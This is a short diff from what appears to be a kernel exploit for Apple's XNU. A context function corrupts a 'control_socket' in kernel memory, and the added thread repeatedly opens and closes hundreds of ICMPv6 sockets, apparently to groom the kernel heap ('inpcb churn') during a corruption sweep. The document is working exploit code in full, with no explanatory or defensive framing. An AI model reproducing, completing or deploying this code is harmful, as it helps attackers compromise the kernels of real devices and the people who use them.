@@ -273,3 +273,16 @@ kern_return_t cs2_find_and_corrupt(mach_port_t memory_object, mach_vm_offset_t s
     LOG("failed to corrupt control_socket at idx: %#zx", control_socket_idx);
     return KERN_FAILURE;  // whoever came up with returning -1 when success returns KERN_SUCCESS???
 }
+
+/* calib-exact live inpcb churn (create/close 512-bursts during the sweep) */
+void* cs2_churn_thread(void* arg) {
+    volatile int* go = (volatile int*)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
+    while (*go) {
+        int fds[512]; int n = 0;
+        for (int i = 0; i < 512; i++) { fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6); if (fds[i] >= 0) n++; }
+        for (int i = 0; i < 512; i++) if (fds[i] >= 0) close(fds[i]);
+        usleep(2000);
+    }
+    return NULL;
+}
